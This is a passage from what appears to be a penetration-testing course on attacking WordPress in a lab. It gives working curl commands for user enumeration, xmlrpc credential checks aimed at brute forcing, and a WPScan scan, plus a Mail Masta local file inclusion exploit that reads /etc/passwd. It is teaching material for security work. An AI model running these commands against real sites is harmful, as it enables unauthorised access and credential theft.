+<p>This can also be done with <code>cURL</code> from the command line. The HTTP response in the below output shows the author that corresponds to the user ID. The URL in the <code>Location</code> header confirms that this user ID belongs to the <code>admin</code> user.</p>
+<p><strong>Existing User</strong></p>
+<p>User Enumeration</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s -I -X GET http:/</span><span class="hljs-regexp">/blog.inlanefreight.com/</span>?author=1
+
+HTTP/1.1 301 Moved Permanently
+Date: Wed, <span class="hljs-number">13</span> May <span class="hljs-number">2020</span> <span class="hljs-number">20</span>:<span class="hljs-number">47</span>:<span class="hljs-number">08</span> GMT
+<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)
+X-Redirect-<span class="hljs-string">By:</span> WordPress
+<span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com/index.php/author/admin/</span>
+Content-<span class="hljs-string">Length:</span> <span class="hljs-number">0</span>
+Content-<span class="hljs-string">Type:</span> text/html; charset=UTF<span class="hljs-number">-8</span>
+</code></pre>
+<p>The above <code>cURL</code> request then redirects us to the user's profile page or the main login page. If the user does not exist, we receive a <code>404 Not Found error</code>.</p>
+<p><strong>Non-Existing User</strong></p>
+<p>User Enumeration</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s -I -X GET http:/</span><span class="hljs-regexp">/blog.inlanefreight.com/</span>?author=100
+
+HTTP/1.1 404 Not Found
+Date: Wed, <span class="hljs-number">13</span> May <span class="hljs-number">2020</span> <span class="hljs-number">20</span>:<span class="hljs-number">47</span>:<span class="hljs-number">14</span> GMT
+<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)
+<span class="hljs-string">Expires:</span> Wed, <span class="hljs-number">11</span> Jan <span class="hljs-number">1984</span> <span class="hljs-number">05</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT
+Cache-<span class="hljs-string">Control:</span> no-cache, must-revalidate, max-age=<span class="hljs-number">0</span>
+<span class="hljs-string">Link:</span> &lt;<span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com/index.php/wp-json/&gt;; rel="https://api.w.org/"</span>
+Transfer-<span class="hljs-string">Encoding:</span> chunked
+Content-<span class="hljs-string">Type:</span> text/html; charset=UTF<span class="hljs-number">-8</span>
+</code></pre>
+<hr>
+<h3 id="second-method">Second Method</h3>
+<p>The second method requires interaction with the <code>JSON</code> endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not. Before this release, all users who had published a post were shown by default.</p>
+<p><strong>JSON Endpoint</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-json/<span class="hljs-keyword">wp</span>/v2/users | jq
+
+[
+  {
+    <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>,
+    <span class="hljs-string">"name"</span>: <span class="hljs-string">"admin"</span>,
+    <span class="hljs-string">"url"</span>: <span class="hljs-string">""</span>,
+    <span class="hljs-string">"description"</span>: <span class="hljs-string">""</span>,
+    <span class="hljs-string">"link"</span>: <span class="hljs-string">"http://blog.inlanefreight.com/index.php/author/admin/"</span>,
+    <span class="hljs-symbol">&lt;SNIP&gt;</span>
+  },
+  {
+    <span class="hljs-string">"id"</span>: <span class="hljs-number">2</span>,
+    <span class="hljs-string">"name"</span>: <span class="hljs-string">"ch4p"</span>,
+    <span class="hljs-string">"url"</span>: <span class="hljs-string">""</span>,
+    <span class="hljs-string">"description"</span>: <span class="hljs-string">""</span>,
+    <span class="hljs-string">"link"</span>: <span class="hljs-string">"http://blog.inlanefreight.com/index.php/author/ch4p/"</span>,
+    <span class="hljs-symbol">&lt;SNIP&gt;</span>
+  },
+<span class="hljs-symbol">&lt;SNIP&gt;</span>
+</code></pre>
+<h2 id="login">Login</h2>
+<hr>
+<p>Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the <code>xmlrpc.php</code> page.</p>
+<p>If our POST request against <code>xmlrpc.php</code> contains valid credentials, we will receive the following output:</p>
+<p><strong>cURL - POST Request</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST -d "<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>CORRECT-PASSWORD<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>" http://blog.inlanefreight.com/xmlrpc.php
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">struct</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>isAdmin<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>url<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://blog.inlanefreight.com/<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>blogid<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>blogName<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Inlanefreight<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>xmlrpc<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://blog.inlanefreight.com/xmlrpc.php<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">struct</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span>
+</code></pre>
+<p>If the credentials are not valid, we will receive a <code>403 faultCode</code> error.</p>
+<p><strong>Invalid Credentials - 403 Forbidden</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST -d "<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>asdasd<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>" http://blog.inlanefreight.com/xmlrpc.php
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">fault</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">struct</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>faultCode<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>403<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>faultString<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Incorrect username or password.<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">struct</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">fault</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span>
+</code></pre>
+<p>These last few sections introduced several methods for performing manual enumeration against a WordPress instance. It is essential to understand manual methods before attempting to use automated tools. While automated tools greatly speed up the penetration testing process, it is our responsibility to understand their impact on the systems we are assessing. A solid understanding of manual enumeration methods will also assist with troubleshooting should any automated tools not function properly or provide unexpected output.</p>
+<h2 id="wpscan-overview">WPScan Overview</h2>
+<hr>
+<h3 id="using-wpscan">Using WPScan</h3>
+<p><a href="https://github.com/wpscanteam/wpscan">WPScan</a> is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS but can also be installed manually with <code>gem</code>.</p>
+<p>WPScan Overview</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ gem install wpscan
+</code></pre>
+<p>Once the installation completes, we can issue a command such as <code>wpscan --hh</code> to verify the installation. This command will show us the usage menu with all of the available command-line switches.</p>
+<p>WPScan Overview</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ wpscan <span class="hljs-comment">--hh</span>
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.1
+
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+Usage: wpscan [options]
+        <span class="hljs-comment">--url URL                                 The URL of the blog to scan</span>
+                                                  Allowed Protocols: http, https
+                                                  Default Protocol if none provided: http
+                                                  This option is mandatory unless <span class="hljs-keyword">update</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">help</span> <span class="hljs-keyword">or</span> hh <span class="hljs-keyword">or</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">is</span>/<span class="hljs-keyword">are</span> supplied
+    -h, <span class="hljs-comment">--help                                    Display the simple help and exit</span>
+        <span class="hljs-comment">--hh                                      Display the full help and exit</span>
+        <span class="hljs-comment">--version                                 Display the version and exit</span>
+        <span class="hljs-comment">--ignore-main-redirect                    Ignore the main redirect (if any) and scan the target url</span>
+    -v, <span class="hljs-comment">--verbose                                 Verbose mode</span>
+        <span class="hljs-comment">--[no-]banner                             Whether or not to display the banner</span>
+                                                  <span class="hljs-keyword">Default</span>: <span class="hljs-literal">true</span>
+        <span class="hljs-comment">--max-scan-duration SECONDS               Abort the scan if it exceeds the time provided in seconds</span>
+    -o, <span class="hljs-comment">--output FILE                             Output to FILE</span>
+    -f, <span class="hljs-comment">--format FORMAT                           Output results in the format supplied</span>
+                                                  Available choices: cli-<span class="hljs-keyword">no</span>-colour, cli-<span class="hljs-keyword">no</span>-color, <span class="hljs-keyword">json</span>, cli
+        &lt;SNIP&gt;
+</code></pre>
+<p>There are various enumeration options that can be specified, such as vulnerable plugins, all plugins, user enumeration, and more. It is important to understand all of the options available to us and fine-tune the scanner depending on the goal (i.e., are we just interested to see if the WordPress site is using any vulnerable plugins, do we need to perform a full audit of all aspects of the site or are we just interested in creating a user list to use in a brute force password guessing attack?).</p>
+<p>WPScan can pull in vulnerability information from external sources to enhance our scans. We can obtain an API token from <a href="https://wpvulndb.com/">WPVulnDB</a>, which is used by WPScan to scan for vulnerability and exploit proof of concepts (POC) and reports. The free plan allows up to 50 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to WPScan using the <code>--api-token</code> parameter.</p>
+<p>Review the various WPScan options using the below Parrot instance by opening a shell and issuing the command <code>wpscan --hh</code>.</p>
+<h2 id="wpscan-enumeration">WPScan Enumeration</h2>
+<hr>
+<h3 id="enumerating-a-website-with-wpscan">Enumerating a Website with WPScan</h3>
+<p>The <code>--enumerate</code> flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments <code>--enumerate ap</code>. Let's run a normal enumeration scan against a WordPress website.</p>
+<p>Note: The default number of threads used is 5, however, this value can be changed using the "-t" flag.</p>
+<p><strong>WPScan Enumeration</strong></p>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk&lt;SNIP&gt;
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] URL: http://blog.inlanefreight.com/                                                   
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Headers                                                                 
+|  - Server: Apache/2.4.38 (<span class="hljs-name">Debian</span>)
+|  - X-Powered-By: PHP/7.3.15
+| Found By: Headers (<span class="hljs-name">Passive</span> Detection)
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] XML-RPC seems to be enabled: http://blog.inlanefreight.com/xmlrpc.php
+| Found By: Direct Access (<span class="hljs-name">Aggressive</span> Detection)
+|  - http://codex.wordpress.org/XML-RPC_Pingback_API
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] The external WP-Cron seems to be enabled: http://blog.inlanefreight.com/wp-cron.php
+| Found By: Direct Access (<span class="hljs-name">Aggressive</span> Detection)
+|  - https://www.iplocation.net/defend-wordpress-from-ddos
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] WordPress version <span class="hljs-number">5.3</span>.2 identified (<span class="hljs-name">Latest</span>, released on <span class="hljs-number">2019</span><span class="hljs-number">-12</span><span class="hljs-number">-18</span>).
+| Found By: Rss Generator (<span class="hljs-name">Passive</span> Detection)
+|  - http://blog.inlanefreight.com/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] WordPress theme in use: twentytwenty
+| Location: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/
+| Readme: http://blog.inlanefreight.com/wp-content/themes/twentytwenty/readme.txt
+| [<span class="hljs-name">!</span>] The version is out of date, the latest version is <span class="hljs-number">1.2</span>
+| Style Name: Twenty Twenty 
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Enumerating Vulnerable Plugins (<span class="hljs-name">via</span> Passive Methods)
+[<span class="hljs-name">i</span>] Plugin(<span class="hljs-name">s</span>) Identified:
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] mail-masta
+| Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/                 
+| Latest Version: <span class="hljs-number">1.0</span> (<span class="hljs-name">up</span> to date)
+| Found By: Urls In Homepage (<span class="hljs-name">Passive</span> Detection)
+| [<span class="hljs-name">!</span>] <span class="hljs-number">2</span> vulnerabilities identified:
+|
+| [<span class="hljs-name">!</span>] Title: Mail Masta <span class="hljs-number">1.0</span> - Unauthenticated Local File Inclusion (<span class="hljs-name">LFI</span>)
+|      - https://www.exploit-db.com/exploits/40290/ 
+| [<span class="hljs-name">!</span>] Title: Mail Masta <span class="hljs-number">1.0</span> - Multiple SQL Injection
+|      - https://wpvulndb.com/vulnerabilities/8740                                                     
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] wp-google-places-review-slider
+| [<span class="hljs-name">!</span>] <span class="hljs-number">1</span> vulnerability identified:
+| [<span class="hljs-name">!</span>] Title: WP Google Review Slider &lt;= <span class="hljs-number">6.1</span> - Authenticated SQL Injection
+|     Reference: https://wpvulndb.com/vulnerabilities/9933          
+
+[<span class="hljs-name">i</span>] No themes Found.  
+&lt;SNIP&gt;
+[<span class="hljs-name">i</span>] No Config Backups Found.
+&lt;SNIP&gt;
+[<span class="hljs-name">i</span>] No Medias Found.
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Enumerating Users (<span class="hljs-name">via</span> Passive and Aggressive Methods)
+&lt;SNIP&gt;
+[<span class="hljs-name">i</span>] User(<span class="hljs-name">s</span>) Identified:
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] admin
+ | Found By: Author Posts - Display Name (<span class="hljs-name">Passive</span> Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (<span class="hljs-name">Aggressive</span> Detection)
+ |  Login Error Messages (<span class="hljs-name">Aggressive</span> Detection)
+
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] david
+&lt;SNIP&gt;
+[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] roger
+&lt;SNIP&gt;
+</code></pre>
+<p>WPScan uses various passive and active methods to determine versions and vulnerabilities, as shown in the scan output above.</p>
+<h2 id="exploiting-a-vulnerable-plugin">Exploiting a Vulnerable Plugin</h2>
+<hr>
+<h3 id="leveraging-wpscan-results">Leveraging WPScan Results</h3>
+<p>The report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called <code>Twenty Twenty</code>. WPScan identified two vulnerable plugins, <code>Mail Masta 1.0</code> and <code>Google Review Slider</code>. This version of the <code>Mail Masta</code> plugin is known to be vulnerable to SQL Injection as well as Local File Inclusion (LFI). The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities.</p>
+<p>Let's verify if the LFI can be exploited based on this exploit-db <a href="https://www.exploit-db.com/exploits/40290/">report</a>. The exploit states that any unauthenticated user can read local files through the path: <code>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code>.</p>
+<p><strong>LFI using Browser</strong></p>
+<p><img src="storage\modules\17\WP\_lfi.png" alt=""></p>
+<hr>
+<p>We can also validate this vulnerability using cURL on the command line.</p>
+<p><strong>LFI using cURL</strong></p>
+<p>Exploiting a Vulnerable Plugin</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl http:/</span><span class="hljs-regexp">/blog.inlanefreight.com/wp</span>-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=<span class="hljs-regexp">/etc/passwd</span>
+
+<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
+<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
+<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span>
+</code></pre>
+<p>We have successfully validated the vulnerability using the data generated in the <code>WPScan</code> report. Now let's try it out ourselves!</p>
+<h2 id="attacking-wordpress-users">Attacking WordPress Users</h2>
+<hr>
+<h3 id="wordpress-user-bruteforce">WordPress User Bruteforce</h3>
+<p>WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: <code>admin</code>, <code>roger</code>, and <code>david</code>. The tool uses two kinds of login brute force attacks, <code>xmlrpc</code> and <code>wp-login</code>. The <code>wp-login</code> method will attempt to brute force the normal WordPress login page, while the <code>xmlrpc</code> method uses the WordPress API to make login attempts through <code>/xmlrpc.php</code>. The <code>xmlrpc</code> method is preferred as it is faster.</p>
+<p><strong>WPscan - XMLRPC</strong></p>
